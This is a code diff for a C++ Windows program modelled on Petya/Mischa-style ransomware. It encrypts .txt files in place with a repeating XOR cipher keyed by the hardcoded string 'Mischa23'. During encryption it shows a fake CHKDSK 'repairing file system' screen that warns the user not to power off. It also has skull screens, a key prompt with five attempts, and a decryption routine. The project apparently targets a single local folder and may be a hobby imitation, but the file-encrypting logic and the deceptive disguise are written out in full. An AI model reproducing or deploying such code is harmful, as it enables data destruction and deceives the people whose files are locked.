@@ -7,10 +7,11 @@
 #include <windows.h>
 #include <conio.h>
 
+
 using namespace std;
 using namespace std::filesystem;
 
-const int DISK_SIZE = 350931;
+
 const string ultimateKey = "Mischa23";
 
 string XOREncryptDecrypt(const string& input, const string& originalKey) {
@@ -19,10 +20,12 @@ string XOREncryptDecrypt(const string& input, const string& originalKey) {
     size_t seed = hash_fn(originalKey);
     for (size_t i = 0; i < input.size(); ++i) {
         output[i] = input[i] ^ static_cast<unsigned char>(seed & 0xFF);
+        // Update seed for next byte
         seed = hash_fn(to_string(seed));
     }
     return output;
 }
+
 void processFilesInDirectory(const string& directory, const string& password) {
     for (const auto& entry : recursive_directory_iterator(directory)) {
         if (entry.path().extension() == ".txt") {
@@ -51,15 +54,87 @@ void processFilesInDirectory(const string& directory, const string& password) {
         }
     }
 }
-
 void StartMessage()
 {
-    int sectorPercent = 0;
+    
+    const string folderPath = "hey";
+    bool keyPressed = false;
+    int fileCount = distance(directory_iterator(folderPath), directory_iterator{});
+    int currentFileIndex = 0;
+
     try {
-        processFilesInDirectory("hey", ultimateKey);
+        bool txtFilesExist = false;
+        for (const auto& entry : directory_iterator(folderPath)) {
+            if (entry.path().extension() == ".txt") {
+                txtFilesExist = true;
+                break;
+            }
+        }
+
+        if (!txtFilesExist) {
+            while (!keyPressed) {
+                cerr << "FATAL: There is nothing to encrypt." << endl;
+                cout << "\n\n(PRESS ANY KEY)";
+                Sleep(150);
+                system("cls");
+                Sleep(150);
+
+                if (_kbhit()) {
+                    break;
+                }
+            }
+            exit(1);
+        }
+        for (const auto& entry : directory_iterator(folderPath)) {
+            if (entry.path().extension() == ".txt") {
+                const string filePath = entry.path().string();
+                ifstream inputFile(filePath, ios::binary);
+                if (!inputFile) {
+                    system("pause");
+                    cerr << "Failed to open input file: " << filePath << "\n";
+                    continue;
+                }
+
+                string data((istreambuf_iterator<char>(inputFile)), istreambuf_iterator<char>());
+                inputFile.close();
+
+                string processedData = XOREncryptDecrypt(data, ultimateKey);
+
+                ofstream outputFile(filePath, ios::binary | ios::trunc);
+                if (!outputFile) {
+                    system("pause");
+                    cerr << "Failed to open output file: " << filePath << "\n";
+                    continue;
+                }
+
+                outputFile.write(processedData.c_str(), processedData.size());
+                outputFile.close();
+
+                currentFileIndex++;
+                
+            }
+        }
+
+        cout << "Repairing file system on C: \n" << endl;
+        cout << "The type of the file system is NTFS.\n" << endl;
+        cout << "One of your disks contains errors and needs to be repaired. This process" << endl;
+        cout << "may take several hours to complete. It is strongly recommended to let it\ncomplete\n";
+
+        cout << "\nWARNING: DO NOT TURN OFF YOUR PC! IF YOU ABORT THIS PROCESS. YOU COULD" << endl;
+        cout << "DESTROY ALL OF YOUR DATA! PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED\nIN!\n";
+
+        int sector = 0;
+        for (const auto& entry : directory_iterator(folderPath)) {
+            if (entry.path().extension() == ".txt") {
+                sector++;
+                int sectorPercent = (sector * 100) / fileCount;
+                string newLine = "\rCHKDSK is repairing sector " + to_string(sector) + " of " + to_string(fileCount) + " (" + to_string(sectorPercent) + "%)";
+                cout << newLine;
+                Sleep(100); 
+            }
+        }
     }
     catch (const filesystem_error& ex) {
-        bool keyPressed = false;
         while (!keyPressed) {
             cerr << "FATAL: There is nothing to encrypt." << endl;
             cout << "\n\n(PRESS ANY KEY)";
@@ -71,22 +146,7 @@ void StartMessage()
                 break;
             }
         }
-        exit(1); 
-    }
-    cout << "Repairing file system on C: \n" << endl;
-    cout << "The type of the file system is NTFS.\n" << endl;
-    cout << "One of your disks contains errors and needs to be repaired. This process" << endl;
-    cout << "may take several hours to complete. It is strongly recommended to let it\ncomplete\n";
-
-    cout << "\nWARNING: DO NOT TURN OFF YOUR PC! IF YOU ABORT THIS PROCESS. YOU COULD" << endl;
-    cout << "DESTROY ALL OF YOUR DATA! PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED\nIN!\n" << endl;
-    
-
-    for (int sector = 0; sector <= DISK_SIZE; sector++)
-    {
-        sectorPercent = (sector * 100) / DISK_SIZE;
-        string newLine = "\rCHKDSK is repairing sector " + to_string(sector) + " of " + to_string(DISK_SIZE) + " (" + to_string(sectorPercent) + "%)";
-        cout << newLine;
+        exit(1);
     }
 }
 void SkullScreen()
@@ -141,7 +201,6 @@ void SkullScreenFlicker() {
 }
 void EncryptedMessage()
 {
-
     string inputKey;
     int attempts = 0;
     int attemptsLimit = 5;
@@ -185,13 +244,68 @@ void EncryptedMessage()
 }
 void DescryptingSystem()
 {
-    int sectorPercent = 0;
-    processFilesInDirectory("hey", ultimateKey);
-    for (int sector = 0; sector <= DISK_SIZE; sector++)
+    const string folderPath = "hey";
+    int fileCount = distance(directory_iterator(folderPath), directory_iterator{});
+    int currentFileIndex = 0;
+
+    try 
     {
-        sectorPercent = (sector * 100) / DISK_SIZE;
-        string newLine = "\rDescrypting Sector " + to_string(sector) + " of " + to_string(DISK_SIZE) + " (" + to_string(sectorPercent) + "%)";
-        cout << newLine;
+        for (const auto& entry : directory_iterator(folderPath)) 
+        {
+            if (entry.path().extension() == ".txt") 
+{
+                const string filePath = entry.path().string();
+                ifstream inputFile(filePath, ios::binary);
+                if (!inputFile) {
+                    system("pause");
+                    cerr << "FATAL: THE FILE CAN NOT BE OPENED" << filePath << "\n";
+                    continue;
+                }
+
+                string data((istreambuf_iterator<char>(inputFile)), istreambuf_iterator<char>());
+                inputFile.close();
+
+                string processedData = XOREncryptDecrypt(data, ultimateKey);
+
+                ofstream outputFile(filePath, ios::binary | ios::trunc);
+                if (!outputFile) {
+                    system("pause");
+                    cerr << "FATAL: THE FILE CAN NOT BE OPENED" << filePath << "\n";
+                    continue;
+                }
+
+                outputFile.write(processedData.c_str(), processedData.size());
+                outputFile.close();
+
+                currentFileIndex++;
+
+            }
+        }
+        int sector = 0;
+        for (const auto& entry : directory_iterator(folderPath)) {
+            if (entry.path().extension() == ".txt") {
+                sector++;
+                int sectorPercent = (sector * 100) / fileCount;
+                string newLine = "\rDescrypting sector " + to_string(sector) + " of " + to_string(fileCount) + " (" + to_string(sectorPercent) + "%)";
+                cout << newLine;
+                Sleep(100);
+            }
+        }
+    }
+    catch (const filesystem_error& ex) {
+        bool keyPressed = false;
+        while (!keyPressed) {
+            cerr << "FATAL: There is nothing to decrypt." << endl;
+            cout << "\n\n(PRESS ANY KEY)";
+            Sleep(150);
+            system("cls");
+            Sleep(150);
+
+            if (_kbhit()) {
+                break;
+            }
+        }
+        exit(1);
     }
 }
 void EndScreen() {
